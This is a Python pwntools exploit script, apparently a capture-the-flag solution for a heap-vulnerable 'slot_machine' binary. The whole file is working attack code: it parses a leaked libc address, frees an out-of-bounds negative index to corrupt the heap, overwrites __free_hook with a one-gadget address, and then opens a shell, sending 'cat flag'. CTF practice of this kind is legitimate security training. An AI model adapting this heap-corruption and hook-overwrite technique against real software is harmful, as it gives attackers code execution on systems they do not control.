#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './slot_machine'
TARGET = ('127.0.0.1', 2333)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def m(size):
    r.sendlineafter('[ 4 ] : bye!\n', '1')
    r.sendlineafter('How much?\n', str(size))

def f(idx):
    r.sendlineafter('[ 4 ] : bye!\n', '2')
    r.sendlineafter('where?\n', str(idx))

def w(data):
    r.sendlineafter('[ 4 ] : bye!\n', '3')
    r.sendafter('what?\n', data)
    
code = ELF(BINARY)
libc = ELF(LIBC64)

r.recvuntil('Here is system : ')
libc.address = int(r.recvuntil('\n')[:-1], 16) - libc.sym['system']
log.info('leak libc address 0x%x' % libc.address)

#attach(0x13d4)
#attach(0x1424)
m(0x3a0)
f(0)
f(-528)
m(0xf0)
w(p64(libc.sym['__free_hook']))
m(0x10)
w(p64(libc.address + 0xe75f0))
f(0)
r.sendline('cat flag')
r.interactive()
